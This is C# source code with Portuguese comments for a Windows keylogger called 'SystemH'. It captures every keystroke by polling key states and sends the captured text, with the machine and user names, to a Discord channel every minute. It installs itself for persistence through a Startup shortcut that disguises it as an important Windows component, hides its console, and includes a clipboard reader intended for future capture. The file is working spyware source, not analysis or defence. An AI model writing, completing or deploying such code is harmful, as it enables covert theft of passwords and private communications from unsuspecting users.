using IWshRuntimeLibrary;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;

namespace CastApp
{
    public class Program
    {
        /// <summary>
        /// Lock para escrita no arquivo para evitar condições de corrida em ambientes multithread
        /// </summary>
        private static readonly object FileLock = new object();

        /// <summary>
        /// Buffer para armazenar teclas antes de escrever no arquivo
        /// </summary>
        private static readonly StringBuilder KeyBuffer = new StringBuilder();
        private static DateTime lastFlush = DateTime.Now;
        private static readonly TimeSpan FlushInterval = TimeSpan.FromSeconds(30);

        /// <summary>
        /// Inicializacao 
        /// </summary>
        private static DiscordConfigService? _configService;
        private static DiscordLogger? _discordLogger;
        private static readonly StringBuilder DiscordBuffer = new StringBuilder();
        private static DateTime lastDiscordSend = DateTime.Now;
        private static readonly TimeSpan DiscordSendInterval = TimeSpan.FromMinutes(1);

        // ADICIONADO: Controle de estado do Discord
        private static bool _discordInitialized = false;
        private static Exception? _lastDiscordError = null;

        private static Mutex? _mutex;

        /// <summary>
        /// Ponto de entrada do programa
        /// </summary>
        private static async Task Main()
        {
            ///<summary>
            /// Natives.FreeConsole(); Esconde o console mas no visual studio continua fica visivel
            /// para que assim possamos ver os erros que possam ocorrer
            /// <summary>
            // TEMPORARIAMENTE COMENTADO PARA DEBUG
            // Natives.FreeConsole();

            // Garante que apenas uma instância do SystemH esteja rodando
            _mutex = new Mutex(initiallyOwned: true, "SystemH", out var createdNew);

            try
            {
                if (createdNew)
                {
                    LogError("=== INICIANDO SYSTEMH ===");
                    LogError($"Diretório de trabalho: {Environment.CurrentDirectory}");
                    LogError($"Usuário: {GetUserName()}");
                    LogError($"Máquina: {GetMachineName()}");

                    await InitializeDiscordServicesWithRetry();

                    // TEMPORARIAMENTE COMENTADO PARA DEBUG
                    //InstallToStartup();
                    LogError("Iniciando captura de teclas...");

                    if (_discordInitialized)
                    {
                        await TestDiscordConnection();
                    }

                    StartKeyCapture();
                }
                else
                {
                    LogError("Outra instância já está rodando. Encerrando...");
                }
            }
            catch (Exception ex)
            {
                LogError($"Erro fatal: {ex.Message}");
                LogError($"StackTrace: {ex.StackTrace}");
                Console.WriteLine($"ERRO FATAL: {ex.Message}");
                Console.WriteLine("Pressione qualquer tecla para continuar...");
                Console.ReadKey();
            }
            finally
            {
                _mutex?.ReleaseMutex();
                _mutex?.Dispose();
            }
        }

        private static async Task InitializeDiscordServicesWithRetry()
        {
            int maxRetries = 3;

            for (int attempt = 1; attempt <= maxRetries; attempt++)
            {
                try
                {
                    LogError($"=== TENTATIVA {attempt} DE INICIALIZAR DISCORD ===");

                    string credentialsFile = "SystemH.enc";
                    if (!System.IO.File.Exists(credentialsFile))
                    {
                        LogError($"ERRO: Arquivo de credenciais '{credentialsFile}' não encontrado!");
                        LogError($"Diretório atual: {Environment.CurrentDirectory}");
                        LogError($"Arquivos no diretório: {string.Join(", ", Directory.GetFiles(Environment.CurrentDirectory))}");
                        continue;
                    }

                    LogError("Arquivo de credenciais encontrado. Inicializando DiscordConfigService...");
                    _configService = new DiscordConfigService();

                    LogError("Obtendo configuração do Discord...");
                    var config = await _configService.GetDiscordConfigAsync();

                    LogError($"Token obtido (primeiros 100 chars): {config.Token?.Substring(0, Math.Min(100, config.Token?.Length ?? 0))}...");
                    LogError($"Guild ID: {config.LogGuildId}");
                    LogError($"Category ID: {config.MachineCategoryId}");

                    if (string.IsNullOrEmpty(config.Token))
                    {
                        throw new Exception("Token do Discord está vazio");
                    }

                    LogError("Criando DiscordLogger...");
                    _discordLogger = new DiscordLogger(
                        config.Token,
                        (ulong)config.LogGuildId,
                        (ulong)config.MachineCategoryId
                    );

                    LogError("Inicializando conexão com Discord...");
                    await _discordLogger.InitializeAsync();

                    _discordInitialized = true;
                    LogError("=== DISCORD INICIALIZADO COM SUCESSO ===");
                    return;
                }
                catch (Exception ex)
                {
                    _lastDiscordError = ex;
                    LogError($"=== ERRO NA TENTATIVA {attempt} ===");
                    LogError($"Erro: {ex.Message}");
                    LogError($"StackTrace: {ex.StackTrace}");

                    if (ex.InnerException != null)
                    {
                        LogError($"Inner Exception: {ex.InnerException.Message}");
                        LogError($"Inner StackTrace: {ex.InnerException.StackTrace}");
                    }

                    if (attempt < maxRetries)
                    {
                        LogError($"Aguardando 5 segundos antes da próxima tentativa...");
                        await Task.Delay(5000);
                    }
                }
            }

            LogError("=== FALHA AO INICIALIZAR DISCORD APÓS TODAS AS TENTATIVAS ===");
            _discordInitialized = false;
        }

        private static async Task TestDiscordConnection()
        {
            try
            {
                LogError("=== TESTANDO CONEXÃO COM DISCORD ===");

                if (_discordLogger == null)
                {
                    LogError("DiscordLogger é null!");
                    return;
                }

                await _discordLogger.SendLogAsync(
                    GetMachineName(),
                    GetUserName(),
                    GetOSVersion(),
                    GetCpuCount(),
                    "🔥 TESTE DE CONEXÃO - SystemH iniciado com sucesso!"
                );

                LogError("=== TESTE DE CONEXÃO ENVIADO COM SUCESSO ===");
            }
            catch (Exception ex)
            {
                LogError($"=== ERRO NO TESTE DE CONEXÃO ===");
                LogError($"Erro: {ex.Message}");
                LogError($"StackTrace: {ex.StackTrace}");
            }
        }

        private static void LogError(string message)
        {
            try
            {
                string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss.fff");
                string logMessage = $"[{timestamp}] {message}\r\n";
                Console.WriteLine($"[DEBUG] {logMessage.Trim()}");
            }
            catch
            {
                // Ignora erros de log
            }
        }

        private static string GetMachineName() => Environment.MachineName;
        private static string GetUserName() => Environment.UserName;
        private static string GetOSVersion() => Environment.OSVersion.ToString();
        private static string GetCpuCount() => Environment.ProcessorCount.ToString();

        public static void InstallToStartup()
        {
            try
            {
                if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                    throw new PlatformNotSupportedException("Este método só é suportado no Windows.");

                string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string text = Path.Combine(folderPath, "SystemH");
                Directory.CreateDirectory(text);
                string path = Environment.ProcessPath ?? Assembly.GetExecutingAssembly().Location;
                string fileName = Path.GetFileName(path);

                // Lista de arquivos necessários
                string[] array = new string[] {
                    fileName,
                    "DSharpPlus.dll",
                    "CastApp.dll",
                    "CastApp.deps.json",
                    "CastApp.runtimeconfig.json",
                    "Microsoft.Extensions.Logging.Abstractions.dll",
                    "Newtonsoft.Json.dll",
                    "SystemH.enc",
                };

                string? directoryName = Path.GetDirectoryName(path);
                if (directoryName == null)
                    throw new InvalidOperationException("O diretório do executável não pôde ser determinado.");

                foreach (string file in array)
                {
                    string sourcePath = Path.Combine(directoryName, file);
                    string destPath = Path.Combine(text, file);
                    if (System.IO.File.Exists(sourcePath) && !System.IO.File.Exists(destPath))
                    {
                        System.IO.File.Copy(sourcePath, destPath, overwrite: false);
                    }
                }

                string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                string pathLink = Path.Combine(folderPath2, "SystemH.lnk");

                Type? wshType = Marshal.GetTypeFromCLSID(new Guid("72C24DD5-D70A-438B-8A42-98424B88AFB8"));
                if (wshType == null)
                    throw new InvalidOperationException("Não foi possível obter o tipo WshShell.");

                WshShell wshShell = (WshShell)Activator.CreateInstance(wshType)!;
                IWshShortcut wshShortcut = (IWshShortcut)(dynamic)wshShell.CreateShortcut(pathLink);
                wshShortcut.TargetPath = Path.Combine(text, fileName);
                wshShortcut.WorkingDirectory = text;
                wshShortcut.WindowStyle = 1;
                wshShortcut.Description = "Inicia o SystemH na inicialização, Parte IMPORTANTE do Windows";
                wshShortcut.Save();
            }
            catch (Exception ex)
            {
                _ = Task.Run(() => LogError($"Erro ao instalar no startup: {ex.Message}"));
            }
        }

        /// <summary>
        /// Loop principal de captura de teclas
        /// </summary>
        private static void StartKeyCapture()
        {
            while (true)
            {
                try
                {
                    // Flush do buffer local
                    if (DateTime.Now - lastFlush > FlushInterval)
                    {
                        FlushBuffer();
                    }

                    if (_discordInitialized && DateTime.Now - lastDiscordSend > DiscordSendInterval)
                    {
                        _ = Task.Run(SendDiscordLogAsync);
                    }

                    bool leftShift = (Natives.GetAsyncKeyState(160) & 0x8000) != 0;
                    bool rightShift = (Natives.GetAsyncKeyState(161) & 0x8000) != 0;
                    bool shift = leftShift || rightShift;
                    bool capsLock = Console.CapsLock;

                    for (int vkCode = 0; vkCode < 256; vkCode++)
                    {
                        short keyState = (short)Natives.GetAsyncKeyState(vkCode);

                        if (keyState == 1 || keyState == -32767)
                        {
                            ProcessKey(vkCode, shift, capsLock);
                        }
                    }

                    Thread.Sleep(1);
                }
                catch (Exception ex)
                {
                    _ = Task.Run(() => LogError($"Erro no loop principal: {ex.Message}"));
                    Thread.Sleep(100);
                }
            }
        }

        private static async Task SendDiscordLogAsync()
        {
            try
            {
                LogError("=== TENTANDO ENVIAR LOG PARA DISCORD ===");

                if (!_discordInitialized)
                {
                    LogError("Discord não inicializado. Tentando reinicializar...");
                    await InitializeDiscordServicesWithRetry();
                    if (!_discordInitialized)
                    {
                        LogError("Falha ao reinicializar Discord. Abortando envio.");
                        return;
                    }
                }

                if (_discordLogger == null)
                {
                    LogError("DiscordLogger é null!");
                    return;
                }

                string content;
                int contentLength;
                bool bufferVazio;

                lock (DiscordBuffer)
                {
                    content = DiscordBuffer.ToString();
                    contentLength = content.Length;
                    bufferVazio = contentLength == 0;

                    if (bufferVazio)
                    {
                        content = $"[{DateTime.Now:HH:mm:ss}] Heartbeat - Sistema ativo";
                    }
                    else
                    {
                        DiscordBuffer.Clear();
                    }
                }

                LogError($"Conteúdo do buffer Discord: {contentLength} caracteres");
                if (bufferVazio)
                {
                    LogError("Buffer vazio, enviando heartbeat para teste");
                }

                if (string.IsNullOrWhiteSpace(content))
                {
                    LogError("Conteúdo está vazio ou só contém espaços");
                    return;
                }

                if (content.Length > 1900)
                {
                    content = content.Substring(content.Length - 1900);
                    content = "...[truncado]..." + content;
                    LogError($"Conteúdo truncado para {content.Length} caracteres");
                }

                LogError($"Enviando para Discord: {content.Substring(0, Math.Min(50, content.Length))}...");

                await _discordLogger.SendLogAsync(
                    GetMachineName(),
                    GetUserName(),
                    GetOSVersion(),
                    GetCpuCount(),
                    content
                );

                lastDiscordSend = DateTime.Now;
                LogError("=== LOG ENVIADO COM SUCESSO PARA DISCORD ===");
            }
            catch (Exception ex)
            {
                LogError($"=== ERRO AO ENVIAR PARA DISCORD ===");
                LogError($"Erro: {ex.Message}");
                LogError($"StackTrace: {ex.StackTrace}");

                if (ex.InnerException != null)
                {
                    LogError($"Inner Exception: {ex.InnerException.Message}");
                }

                _discordInitialized = false;
            }
        }

        /// <summary>
        /// Processa uma tecla pressionada
        /// </summary>
        private static void ProcessKey(int vkCode, bool shift, bool capsLock)
        {
            try
            {
                var keyInfo = GetKeyInfo(vkCode, shift, capsLock);

                if (!string.IsNullOrEmpty(keyInfo))
                {
                    lock (KeyBuffer)
                    {
                        KeyBuffer.Append(keyInfo);
                    }

                    if (_discordInitialized)
                    {
                        lock (DiscordBuffer)
                        {
                            DiscordBuffer.Append(keyInfo);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                _ = Task.Run(() => LogError($"Erro ao processar tecla {vkCode}: {ex.Message}"));
            }
        }

        /// <summary>
        /// Converte código de tecla virtual para caractere/string
        /// </summary>
        private static string GetKeyInfo(int vkCode, bool shift, bool capsLock)
        {
            return vkCode switch
            {
                // Teclas especiais
                8 => "[BACKSPACE]", // Backspace
                9 => "\t",           // Tab
                13 => "\r\n",        // Enter
                27 => "[ESC]",       // Escape
                32 => " ",           // Espaço

                // Teclas de função
                >= 112 and <= 123 => $"[F{vkCode - 111}]", // F1-F12

                // Setas
                37 => "[←]", // Esquerda
                38 => "[↑]", // Cima
                39 => "[→]", // Direita
                40 => "[↓]", // Baixo

                // Letras A-Z
                >= 65 and <= 90 => ProcessLetter((char)vkCode, shift, capsLock),

                // Números e símbolos
                >= 48 and <= 57 => ProcessNumber(vkCode, shift),

                // Numpad
                >= 96 and <= 105 => ((char)(vkCode - 48)).ToString(), // Numpad 0-9

                // Pontuação comum
                186 => shift ? ":" : ";",    // ;:
                187 => shift ? "+" : "=",    // =+
                188 => shift ? "<" : ",",    // ,<
                189 => shift ? "_" : "-",    // -_
                190 => shift ? ">" : ".",    // .>
                191 => shift ? "?" : "/",    // /?
                192 => shift ? "~" : "`",    // `~
                219 => shift ? "{" : "[",    // [{
                220 => shift ? "|" : "\\",   // \|
                221 => shift ? "}" : "]",    // ]}
                222 => shift ? "\"" : "'",   // '"

                // Outras teclas especiais
                16 => "[SHIFT]",
                17 => "[CTRL]",
                18 => "[ALT]",
                20 => "[CAPS]",
                144 => "[NUMLOCK]",
                145 => "[SCROLL]",

                _ => null! // Tecla não mapeada
            };
        }

        /// <summary>
        /// Processa letras considerando Shift e CapsLock
        /// </summary>
        private static string ProcessLetter(char letter, bool shift, bool capsLock)
        {
            bool shouldBeUpper = shift ^ capsLock;
            return shouldBeUpper ? letter.ToString() : char.ToLower(letter).ToString();
        }

        /// <summary>
        /// Processa números e seus símbolos correspondentes
        /// </summary>
        private static string ProcessNumber(int vkCode, bool shift)
        {
            return vkCode switch
            {
                48 => shift ? ")" : "0",
                49 => shift ? "!" : "1",
                50 => shift ? "@" : "2",
                51 => shift ? "#" : "3",
                52 => shift ? "$" : "4",
                53 => shift ? "%" : "5",
                54 => shift ? "^" : "6",
                55 => shift ? "&" : "7",
                56 => shift ? "*" : "8",
                57 => shift ? "(" : "9",
                _ => null!
            };
        }

        /// <summary>
        /// Para ler o conteúdo da área de transferência
        /// Sera usado para capturar textos copiados no futuro
        /// </summary>
        private static string ReadClipboard()
        {
            if (!Natives.OpenClipboard(IntPtr.Zero))
            {
                return "";
            }
            try
            {
                nint clipboardData = Natives.GetClipboardData(13u);
                if (clipboardData == IntPtr.Zero)
                {
                    return "";
                }
                nint num = Natives.GlobalLock(clipboardData);
                if (num == IntPtr.Zero)
                {
                    return "";
                }
                string result = Marshal.PtrToStringUni(num) ?? "";
                Natives.GlobalUnlock(clipboardData);
                return result;
            }
            finally
            {
                Natives.CloseClipboard();
            }
        }

        /// <summary>
        /// Escreve o buffer no arquivo de log
        /// </summary>
        private static void FlushBuffer()
        {
            try
            {
                string content;
                lock (KeyBuffer)
                {
                    if (KeyBuffer.Length == 0) return;

                    content = KeyBuffer.ToString();
                    KeyBuffer.Clear();
                }

                lastFlush = DateTime.Now;
            }
            catch (Exception ex)
            {
                _ = Task.Run(() => LogError($"Erro ao escrever no arquivo: {ex.Message}"));
            }
        }
    }
}